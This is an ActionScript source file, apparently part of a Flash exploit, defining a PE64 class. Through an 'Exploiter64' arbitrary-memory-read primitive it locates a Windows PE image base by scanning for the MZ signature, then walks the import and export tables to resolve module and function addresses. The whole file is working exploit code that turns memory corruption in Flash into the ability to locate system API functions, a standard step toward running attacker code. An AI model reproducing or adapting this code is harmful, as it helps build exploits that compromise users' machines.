package
{
    public class PE64
    {
        private var eba:Exploiter64

        public function PE64(ba:Exploiter64)
        {
            eba = ba
        }
		
        public function base(addr:Address64):Address64
        {
			var partial:Address64 = new Address64(addr.lo & 0xffff0000, addr.hi)
            while (true) {
                if (eba.ba_read(partial) == 0x00905a4d) return partial
                partial = partial.offset(-0x1000)
            }
            
			throw new Error()
        }
		
        public function module(name:String, addr:Address64):Address64
        {
			var i:uint = 0
			var nt_hdr_offset:uint = eba.ba_read(addr.offset(0x3c))
			var pe:Address64 = addr.offset(nt_hdr_offset)
			var iat_dir:Address64 = pe.offset(0x90)
            var iat:Address64 = new Address64(addr.lo + eba.ba_read(iat_dir), addr.hi)
			var iat_length:uint = eba.ba_read(iat_dir.offset(4))
			var mod_name:String
			var iat_entry:Address64
			var iat_name:Address64
			var iat_fnc:Address64
            while (i < iat_length) {
				iat_entry = iat.offset(i * 0x14)
				iat_name = new Address64(eba.ba_read(iat_entry.offset(0xc)) + addr.lo, addr.hi)
				iat_fnc = new Address64(eba.ba_read(iat_entry.offset(0x10)) + addr.lo, addr.hi)
                mod_name = eba.read_string(iat_name, name.length)
                if (mod_name.toUpperCase() == name.toUpperCase()) {
					return base(eba.ba_read_addr(iat_fnc))
				}
				i = i + 1
            }
			
			throw new Error('FAIL!')
        }

        public function procedure(name:String, addr:Address64):Address64
        {
			var nt_hdr_offset:uint = eba.ba_read(addr.offset(0x3c))
			var pe:Address64 = addr.offset(nt_hdr_offset)
			var eat_dir:Address64 = pe.offset(0x88)
            var eat:Address64 = new Address64(addr.lo + eba.ba_read(eat_dir), addr.hi)
			var eat_length:uint = eba.ba_read(eat_dir.offset(4))
			var numberOfNames:uint = eba.ba_read(eat.offset(0x18))
            var addressOfFunctions:Address64 =  new Address64(eba.ba_read(eat.offset(0x1c)) + addr.lo, addr.hi)
            var addressOfNames:Address64 = new Address64(eba.ba_read(eat.offset(0x20)) + addr.lo, addr.hi)
            var addressOfNameOrdinals:Address64 = new Address64(eba.ba_read(eat.offset(0x24)) + addr.lo, addr.hi)
            var proc_name:String
			var entry:Address64 
			var i:uint = 0
			
            while (i < numberOfNames) {
				entry = new Address64(addr.lo + eba.ba_read(addressOfNames.offset(i * 4)), addr.hi)
                proc_name = eba.read_string(entry, name.length)
                if (proc_name.toUpperCase() == name.toUpperCase()) {
					var function_offset:uint = eba.ba_read_word(addressOfNameOrdinals.offset(i * 2)) * 4
					var address_of_function:Address64 = new Address64(addr.lo + eba.ba_read(addressOfFunctions.offset(function_offset)), addr.hi)
					return address_of_function
				}
				
				i = i + 1
            }

			throw new Error('FAIL!')
        }
    }
}
